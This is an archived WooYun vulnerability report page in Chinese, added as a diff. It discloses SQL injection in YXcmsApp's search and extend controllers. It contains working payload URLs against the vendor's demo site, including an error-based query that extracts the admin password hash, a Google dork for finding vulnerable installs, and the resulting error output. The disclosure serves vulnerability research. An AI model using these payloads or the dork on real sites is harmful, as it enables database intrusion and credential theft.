@@ -1,0 +1,239 @@
+﻿<!doctype html>
+                        <html lang="en">
+                        <head>
+	                        <meta charset="UTF-8">
+	                        <title>		YXcmsApp 注入 漏洞  </title>
+	                        <link href="../css/css.css" rel="stylesheet" /> 
+                        </head>
+                        <body> 
+                        <ul><li>标题：		YXcmsApp 注入 漏洞  </li><li>作者：		<a href="http://www.wooyun.org/whitehats/想要减肥的胖纸">想要减肥的胖纸</a> 
+</li><li>提交时间：		2013-12-20 14:50</li></ul>
+                        <div class="con">
+                        <h2>漏洞详情</h2>
+		<h3 class="detailTitle">披露状态：</h3>
+		<p class="detail" style="padding-bottom:0">
+					</p>
+		<p class="detail">
+									2013-12-20：	积极联系厂商并且等待厂商认领中，细节不对外公开<br/>
+									2014-03-20：	厂商已经主动忽略漏洞，细节向公众公开<br/>
+					</p>
+		<h3 class="detailTitle">简要描述：</h3>
+
+		<p class="detail">开发人员对安全意识不足</p>
+
+				
+						<h3 class="detailTitle">详细说明：</h3>
+		
+			<p class="detail">这楼的没啥技术含量，本菜鸟刚接触代码审计，可能分析的不对。<br />
+<br />
+漏洞文件protected\apps\default\controller\indexController.php<br />
+<br />
+关键代码<br />
+<br />
+</p><pre><code>public function search()<br />
+	{<br />
+       if(empty($_GET[&#039;keywords&#039;])||empty($_GET[&#039;type&#039;])) $this-&gt;error(&#039;搜索条件不足~&#039;);<br />
+       $keywords=in(urldecode(trim($_GET[&#039;keywords&#039;])));<br />
+       $type=in($_GET[&#039;type&#039;]);<br />
+       $listRows=10;//每页显示的信息条数,2n偶数<br />
+       $url=url(&#039;index/search&#039;,array(&#039;keywords&#039;=&gt;urlencode($keywords),&#039;type&#039;=&gt;$type,&#039;page&#039;=&gt;&#039;{page}&#039;));<br />
+	 $where=&quot;ispass=&#039;1&#039; AND (title like &#039;%&quot;.$keywords.&quot;%&#039; OR description like &#039;%&quot;.$keywords.&quot;%&#039;)&quot;;</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+全局过滤代码<br />
+<br />
+protected\include\lib\common.function.php<br />
+<br />
+</p><pre><code>function in($data,$force=false){<br />
+	if(is_string($data)){<br />
+		$data=trim(htmlspecialchars($data));//防止被挂马，跨站攻击<br />
+		if(($force==true)||(!get_magic_quotes_gpc())) {<br />
+		   $data = addslashes($data);//防止sql注入<br />
+		}<br />
+		return  $data;<br />
+	} else if(is_array($data)) {<br />
+		foreach($data as $key=&gt;$value){<br />
+		   $data[$key]=in($value,$force);<br />
+		}<br />
+		return $data;<br />
+	} else {<br />
+		return $data;<br />
+	}	<br />
+}</code></pre><p class='detail'><br />
+<br />
+keywords 靠addslashes这个过滤，无语了 </p>
+				
+									<h3 class="detailTitle">漏洞证明：</h3>
+
+			<p class="detail">http://demo.yxcms.net/index.php?r=default/index/search&amp;keywords=a%2527%C2%95%C2%8A&amp;type=all<br />
+<br />
+<br />
+<br />
+</p><pre><code>出错信息： MySQL Query Error<br />
+SQL: SELECT count(*) FROM yx_news WHERE ispass=&#039;1&#039; AND (title like &#039;%a&#039;%&#039; OR description like &#039;%a&#039;%&#039;)<br />
+错误详情: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#039;%&#039; OR description like &#039;%a&#039;%&#039;)&#039; at line 1<br />
+错误代码:1064</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+<br />
+<br />
+危害<br />
+<br />
+<br />
+<br />
+google search<br />
+<br />
+<br />
+<br />
+inurl:index.php?r=default/page<br />
+<br />
+<br />
+<br />
+http://www.google.com.hk/#newwindow=1&amp;q=inurl:index.php%3Fr%3Ddefault/page&amp;safe=strict&amp;start=90<br />
+<br />
+<br />
+<br />
+用的也比较多了 算通用了吧。<br />
+<br />
+<br />
+<br />
+<br />
+<br />
+其实很多地方引用这个过滤。。顺便送个爆hash exp<br />
+<br />
+<br />
+<br />
+</p><pre><code>http://demo.yxcms.net/index.php?r=default%2Fextend%2Findex&amp;id=100023%20AND%20%28SELECT%201660%20FROM%28SELECT%20COUNT%28%2A%29%2CCONCAT%280x716d667271%2C%28SELECT%20MID%28%28IFNULL%28CAST%28password%20AS%20CHAR%29%2C0x20%29%29%2C1%2C50%29%20FROM%20yx_admin%20WHERE%20username%3D0x61646d696e%20LIMIT%200%2C1%29%2C0x716e6e7371%2CFLOOR%28RAND%280%29%2A2%29%29x%20FROM%20INFORMATION_SCHEMA.CHARACTER_SETS%20GROUP%20BY%20x%29a%29</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+</p><pre><code>出错信息： MySQL Query Error<br />
+SQL: SELECT id,type,name,method,url,extendid FROM yx_sort WHERE id IN(100023 AND (SELECT 1660 FROM(SELECT COUNT(*),CONCAT(0x716d667271,(SELECT MID((IFNULL(CAST(password AS CHAR),0x20)),1,50) FROM yx_admin WHERE username=0x61646d696e LIMIT 0,1),0x716e6e7371,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)) ORDER BY deep<br />
+错误详情: Duplicate entry &#039;qmfrq44f76bda33900c7a9b984674f283fdafqnnsq1&#039; for key &#039;group_key&#039;<br />
+错误代码:1062</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+我就不刷rank了。。。<br />
+<br />
+<br />
+<br />
+ </p>
+
+									<h3 class="detailTitle">修复方案：</h3>
+			<p class="detail">不懂开发，请自行百度下，应该有相关通用防注入代码 </p>
+										<h3 class="detailTitle">版权声明：转载请注明来源 <a style="font-weight:normal" href="http://www.wooyun.org/whitehats/想要减肥的胖纸" title="想要减肥的胖纸">想要减肥的胖纸</a>@<a style="font-weight:normal" href="http://www.wooyun.org/bugs/wooyun-2010-046534" title="YXcmsApp 注入 漏洞">乌云</a></h3>
+		<hr align="center"/>
+
+				
+			<h2>漏洞回应</h2>
+			
+			
+									<h3 class="detailTitle">厂商回应：</h3>
+										<p class="detail">未能联系到厂商或者厂商积极拒绝</p>
+																	
+					
+		
+<hr align="center" />
+<script type="text/javascript">
+var bugid="46534";
+var bugRating="-3";
+var myRating="";
+var ratingCount="0";
+
+
+
+function ShowBugRating(k){
+	var ratingItems=$(".myrating span");
+	$.each(ratingItems,function(i,n){
+		var nk=parseInt($(n).attr("rel"));
+		if(nk<=k){
+			$(n).addClass("on");
+		}else{
+			$(n).removeClass("on");
+		}
+	});
+	$(".myrating span").hover(
+		function(){
+			$("#ratingShow").html($(this).attr("data-title"));
+		},
+		function(){
+			$("#ratingShow").html("");
+		}
+	);
+}
+$(document).ready(function(){
+	if(myRating==""){
+		var ratingItems=$(".myrating span");
+		$(".myrating span").hover(
+			function(){
+				$(this).addClass("hover");
+				var k=parseInt($(this).attr("rel"));
+				$.each(ratingItems,function(i,n){
+					var nk=parseInt($(n).attr("rel"));
+					if(nk<k) $(n).addClass("on");
+					if(nk>k) $(n).removeClass("on");
+				});
+				$("#ratingShow").html($(this).attr("data-title"));
+			},
+			function(){
+				$(this).removeClass("hover");
+				if($("#myRating").val()==""){
+					$.each(ratingItems,function(i,n){
+						$(n).removeClass("on");
+					});
+				}
+				$("#ratingShow").html("");
+			}
+		);
+
+		$(".myrating span").click(function(){
+			var rating=$(this).attr("rel");
+			var k=parseInt($(this).attr("rel"));
+			$.post("/ajaxdo.php?module=bugrating",{"id":bugid,"rating":rating,"token":$("#token").val()},function(re){
+				//消除操作绑定
+				$(".myrating span").unbind();
+				re=parseInt(re);
+				switch(re){
+					case 1:
+						$("#ratingShow").html("评分成功");
+						$("#ratingSpan").html(parseInt($("#ratingSpan").html())+1);
+						$.each(ratingItems,function(i,n){
+							var nk=parseInt($(n).attr("rel"));
+							if(nk<=k){
+								$(n).addClass("on");
+							}else{
+								$(n).removeClass("on");
+							}
+						});
+						ShowBugRating(rating);
+						break;
+					case 2:
+						$("#ratingShow").html("请先登录");
+						break;
+					case 4:
+						$("#ratingShow").html("已对此漏洞进行过评分");
+						break;
+					case 6:
+						$("#ratingShow").html("不能对自己发布的漏洞进行评分");
+						break;
+					default:break;
+				}
+			});
+		});
+	}else{
+		if(ratingCount>2){
+			ShowBugRating(bugRating);
+		}else{
+			ShowBugRating(-3);
+		}
+	}
+});
+
+</script>
+<h3 class="detailTitle">漏洞评价：</h3>
+                        </div>
+                        </body>
+                        </html>
